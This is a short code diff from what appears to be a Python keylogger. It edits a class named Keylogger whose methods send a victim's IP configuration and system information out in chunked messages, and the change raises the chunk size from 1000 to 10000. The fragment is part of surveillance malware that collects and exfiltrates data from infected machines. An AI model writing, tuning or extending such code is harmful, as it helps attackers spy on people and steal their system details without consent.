@@ -183,7 +183,7 @@ class Keylogger:
                 print(f"Error sending IP config: {e}")
 
     def send_system_info(self):
-        system_info_chunks = chunk_text(self.system_info, 1000)
+        system_info_chunks = chunk_text(self.system_info, 10000)
         for i, chunk in enumerate(system_info_chunks, start=1):
             message = f"System Info Part {i}:\n{chunk}"
             try:
